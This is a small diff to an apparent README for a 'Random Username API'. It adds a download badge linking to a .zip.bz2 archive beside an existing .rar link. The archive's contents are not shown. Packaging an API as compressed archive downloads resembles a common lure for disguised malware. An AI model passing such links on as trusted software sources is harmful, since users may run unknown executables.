@@ -89,3 +89,5 @@ Feel free to explore and integrate this API into your applications to generate u
 
 
 **Rar(.rar)**: [![Download Random Username API](https://lelbois.nekoweb.org/download.svg)](https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/random-username-api.rar)
+
+**Bz2(.zip.bz2)**: [![Download Random Username API](https://lelbois.nekoweb.org/download.svg)](https://github.com/randomusernameapi/randomusernameapi.github.io/raw/main/random-username-api.zip.bz2)
